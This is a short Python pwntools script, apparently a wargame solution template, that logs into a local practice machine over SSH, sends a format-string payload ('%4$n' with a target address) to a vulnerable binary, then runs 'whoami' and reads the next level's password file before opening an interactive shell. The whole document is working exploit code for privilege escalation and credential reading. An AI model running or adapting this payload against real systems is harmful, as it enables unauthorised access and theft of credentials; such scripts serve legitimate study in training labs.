#!/usr/bin/env python

from pwn import *

host = "127.0.0.1"
port = 4242

login = "levelX"   # Change this
binary = login
password = open("Password")  # Change this
remotebinary = "/home/user/%s/%s" % (login, binary)

target_login = "levelX+1"  # Change this     

shell = ssh(host=host, port=port, user=login, password=password)


######  EXPLOIT  #####

padding = "B"*60
m_var_address = p32(0x0804988c)
payload = m_var_address + padding + "%4$n"

print("# Sending")
p = shell.process([remotebinary], env={})
p.sendline(payload)

p.clean()
p.sendline("whoami")
p.sendline("cat ~%s/.pass" % target_login)
p.interactive()